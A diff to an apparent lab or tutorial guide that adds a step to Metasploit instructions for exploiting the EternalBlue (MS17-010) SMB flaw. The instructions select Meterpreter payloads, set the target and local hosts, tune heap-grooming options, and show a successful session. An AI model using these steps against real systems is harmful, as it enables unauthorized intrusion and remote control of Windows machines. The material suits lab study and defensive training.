@@ -33,7 +33,8 @@ The EternalBlue exploit targets a vulnerability in the Server Message Block (SMB
 3. Choose a module. For automatic modules, simply enter `use 0`. Note that since no payload was configured, it defaults to `windows/x64/meterpreter/reverse_tcp`
 4. Enter `show payloads`, and choose a payload number 26 `payload/windows/x64/meterpreter/bind_tcp_rc4`
 5. To set the target's IP address, enter `show options` and `set RHOSTS <target_IP_address>`
-6. (Optional) Enter `set GroomAllocations 10` and `set GroomDelta 5` for controlling how memory is arranged on the target computer during an exploit. GroomAllocations decides how many memory spaces the exploit creates to prepare the computer's memory, while GroomDelta fine-tunes the size of the memory spaces
+6. Ensure the local machine's IP address is correct, otherwise set it using the `set LHOSTS <local_ip_address>` command
+7. (Optional) Enter `set GroomAllocations 10` and `set GroomDelta 5` for controlling how memory is arranged on the target computer during an exploit. GroomAllocations decides how many memory spaces the exploit creates to prepare the computer's memory, while GroomDelta fine-tunes the size of the memory spaces
 
 Screenshot of Metasploit successfully exploiting MS17-010 vulnerability with an active Meterpreter session shown below: <br/>
 ![image](https://github.com/user-attachments/assets/6c8cfafb-7834-4b86-8c90-dbfe87114ffe)
